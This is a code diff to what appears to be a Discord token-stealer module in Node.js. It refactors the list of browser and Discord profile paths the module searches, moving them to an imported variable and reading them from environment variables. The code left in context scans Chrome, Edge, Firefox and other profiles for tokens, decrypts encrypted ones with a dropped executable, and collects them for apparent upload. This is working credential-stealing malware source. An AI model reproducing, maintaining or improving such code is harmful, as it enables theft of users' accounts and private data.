@@ -1,5 +1,5 @@
 const { join } = require('path');
-const { roamingAppData, localAppData } = require('../util/variables');
+const { browsers } = require('../util/variables');
 const { execSync } = require('child_process');
 const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
 const axios = require('axios');
@@ -9,31 +9,6 @@ const { userAgent } = require('../config');
 const jsonFile = join(tempFolder, 'Discord.json');
 writeFileSync(jsonFile, '{}');
 const tokens = [];
-const paths = {
-  'Discord': join(roamingAppData, 'discord'),
-  'Discord Canary': join(roamingAppData, 'discordcanary'),
-  'Lightcord': join(roamingAppData, 'Lightcord'),
-  'Discord PTB': join(roamingAppData, 'discordptb'),
-  'Opera': join(roamingAppData, 'Opera Software', 'Opera Stable'),
-  'Opera GX': join(roamingAppData, 'Opera Software', 'Opera GX Stable'),
-  'Amigo': join(localAppData, 'Amigo', 'User Data'),
-  'Torch': join(localAppData, 'Torch', 'User Data'),
-  'Kometa': join(localAppData, 'Kometa', 'User Data'),
-  'Orbitum': join(localAppData, 'Orbitum', 'User Data'),
-  'CentBrowse': join(localAppData, 'CentBrowser', 'User Data'),
-  '7Sta': join(localAppData, '7Star', '7Star', 'User Data'),
-  'Sputnik': join(localAppData, 'Sputnik', 'Sputnik', 'User Data'),
-  'Vivaldi': join(localAppData, 'Vivaldi', 'User Data'),
-  'Chrome': join(localAppData, 'Google', 'Chrome', 'User Data'),
-  'Chrome SxS': join(localAppData, 'Google', 'Chrome SxS', 'User Data'),
-  'Firefox': join(roamingAppData, 'Mozilla', 'Firefox', 'Profiles'),
-  'Epic Privacy Browser': join(localAppData, 'Epic Privacy Browser', 'User Data'),
-  'Microsoft Edge': join(localAppData, 'Microsoft', 'Edge', 'User Data'),
-  'Uran': join(localAppData, 'uCozMedia', 'Uran', 'User Data'),
-  'Yandex': join(localAppData, 'Yandex', 'YandexBrowser', 'User Data'),
-  'Brave': join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
-  'Iridium': join(localAppData, 'Iridium', 'User Data')
-};
 
 const decryptToken = (token, key) => execSync(
   join(tempFolder, 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
@@ -56,7 +31,7 @@ const decryptRickRoll = (path) => {
         line.match(tokenRegex)?.forEach(token => {
           if (!tokens.includes(token)) tokens.push({
             token,
-            source: path.replace(localAppData, '').replace(roamingAppData, '').replace('User Data', '').split('\\').join(' ').trim()
+            source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
           });
         });
         line.match(encryptedTokenRegex)?.forEach(token => {
@@ -70,7 +45,7 @@ const decryptRickRoll = (path) => {
           typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
         ) tokens.push({
           token,
-          source: path.replace(localAppData, '').replace(roamingAppData, '').replace('User Data', '').split('\\').join(' ').trim()
+          source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
         });
       });
       if (tokens.length <= 0) {
@@ -137,10 +112,10 @@ const handleTokens = (tokens, resolve) => {
 };
 
 module.exports = new Promise((resolve) => {
-  Object.keys(paths).forEach(path => {
-    if (!existsSync(paths[path])) return;
+  Object.keys(browsers).forEach(path => {
+    if (!existsSync(browsers[path])) return;
     if (path.includes('Firefox')) {
-      const search = execSync('where /r . *.sqlite', { cwd: paths[path] }).toString();
+      const search = execSync('where /r . *.sqlite', { cwd: browsers[path] }).toString();
       if (search) {
         search.split(/\r?\n/).forEach((filePath) => {
           filePath = filePath.trim();
@@ -173,7 +148,7 @@ module.exports = new Promise((resolve) => {
       }
       handleTokens(tokens, resolve);
     } else {
-      decryptRickRoll(paths[path]).then(() => {
+      decryptRickRoll(browsers[path]).then(() => {
         handleTokens(tokens, resolve);
       });
     }
